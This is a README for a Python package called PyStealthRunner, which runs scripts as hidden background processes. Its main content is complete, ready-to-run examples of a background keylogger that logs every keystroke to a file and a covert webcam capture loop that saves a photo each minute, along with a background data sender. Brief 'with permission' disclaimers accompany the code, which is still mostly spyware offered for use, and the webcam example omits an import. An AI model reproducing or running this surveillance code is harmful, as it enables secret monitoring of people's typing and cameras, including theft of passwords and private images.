# PyStealthRunner

PyStealthRunner is a Python package for running scripts as background processes without a GUI, ideal for ethical hacking tasks like monitoring or data testing (use only with explicit permission).

## How It Works

PyStealthRunner internally manages Python scripts as detached background processes. When you use the `Runner` class to launch a script, it:

1. **Spawns a New Process:** Uses Python's `subprocess` module to start a new interpreter instance running your script, with special environment variables set to indicate background mode.
2. **Environment Control:** Sets `PYSTEALTH_BG=1` for the background process, so your script can detect if it is running in background mode and adjust its behavior accordingly.
3. **Process Tracking:** Maintains a PID file or in-memory registry to track running scripts, allowing you to check status or stop them later.
4. **Cross-Platform:** Handles process spawning and termination in a way that works on Windows, Linux, and macOS.
5. **Communication:** Optionally uses a local TCP port (default: 50506, configurable via `PYSTEALTH_PORT`) for simple status and control messaging between the main process and background scripts.

This design allows you to run, monitor, and stop scripts programmatically, without needing to manage OS-level process details yourself.

## Features
- Run Python scripts discreetly in the background.
- Cross-platform: Windows, Linux, macOS.
- Simple API to start, stop, and check script status.
- Use cases: keylogging, data testing, webcam monitoring (for authorized testing).

## Installation

Requires Python 3.6+. Install via pip:

```bash
pip install pystealthrunner
```

Or clone and install:

```bash
git clone https://github.com/SdxShadow/PyStealthRunner.git
cd pystealthrunner
pip install .
```

## Usage

Use the `Runner` class to manage background scripts:

```python
from pystealthrunner import Runner

runner = Runner()
pid = runner.run_script()  # Run current script
print(f"PID: {pid}")
print(runner.status())  # Check running scripts
runner.stop_script(pid)  # Stop script
```

### Methods
- `run_script(script_path=None)`: Runs a script in the background. If no path, uses the calling script. Returns PID.
- `stop_script(pid)`: Stops the script with the given PID.
- `status()`: Returns PIDs of running scripts.

### Environment Variables
- `PYSTEALTH_PORT`: Communication port (default: 50506).
- `PYSTEALTH_BG`: Set to "1" for background scripts (auto-handled).

## Examples

### 1. Keylogger 
Logs keystrokes to a file for authorized security testing.

```python
from pystealthrunner import Runner
import keyboard
import datetime
import os

if __name__ == "__main__":
    runner = Runner()
    if os.environ.get("PYSTEALTH_BG") != "1":
        pid = runner.run_script()
        print(pid)
        exit()

    log_file = os.path.expanduser("~/keylog.txt")
    while True:
        event = keyboard.read_event(suppress=True)
        if event.event_type == keyboard.KEY_DOWN:
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(log_file, "a") as f:
                f.write(f"[{ts}] {event.name}\n")
```

Run it directly (no extra file needed):

```bash
python keylogger.py
```

Output in `~/keylog.txt`:

```
[2025-07-22 17:34:00] a
[2025-07-22 17:34:01] enter
```

**Note**: Requires `pip install keyboard`. Use only with explicit permission on authorized systems.

### 2. Data Sender
Sends data to a target URL in the background for testing server responses.

```python
from pystealthrunner import Runner
import requests
from time import sleep
import os

if __name__ == "__main__":
    runner = Runner()
    if os.environ.get("PYSTEALTH_BG") != "1":
        pid = runner.run_script()
        print(pid)
        exit()

    i = 10
    while i > 0:
        try:
            payload = {"data": f"test{i}", "source": "pystealthrunner"}
            requests.post("http://127.0.0.1:9090/submit", json=payload)
            with open(os.path.expanduser("~/data_sent.log"), "a") as f:
                f.write(f"Sent data test{i}\n")
        except:
            pass
        sleep(2)
        i -= 1
```

Run it directly:

```bash
python data_sender.py
```

Output in `~/data_sent.log`:

```
Sent data test10
Sent data test9
```

**Note**: Requires `pip install requests`. Use only on authorized test servers.

### 3. Continuous Webcam Monitor 
Captures webcam snapshots periodically for security testing.

```python
from pystealthrunner import Runner
import cv2
import datetime
import os

if __name__ == "__main__":
    runner = Runner()
    if os.environ.get("PYSTEALTH_BG") != "1":
        pid = runner.run_script()
        print(pid)
        exit()

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        exit()
    save_dir = os.path.expanduser("~/webcam_captures")
    os.makedirs(save_dir, exist_ok=True)
    while True:
        ret, frame = cap.read()
        if ret:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            cv2.imwrite(f"{save_dir}/capture_{ts}.jpg", frame)
        sleep(60)  # Capture every minute
    cap.release()
```

Run it directly:

```bash
python webcam_monitor.py
```

Saves images to `~/webcam_captures/capture_YYYYMMDD_HHMMSS.jpg`.

**Note**: Requires `pip install opencv-python`. Use only with explicit permission.

## Use Cases
- Ethical hacking: Keylogging, data testing, webcam monitoring (with permission).
- Automation: Run scheduled tasks or silent monitoring.

## Notes
- Scripts must be valid `.py` files.
- Ensure legal authorization for hacking-related scripts.

## Troubleshooting
- **Script Fails**: Verify `.py` file and dependencies.
- **Port Conflicts**: Set `PYSTEALTH_PORT` to an open port.
- **Permissions**: Ensure write access for PID file and logs.

## Contributing
Submit issues or PRs at [GitHub](https://github.com/SdxShadow/PyStealthRunner).

## License
MIT License.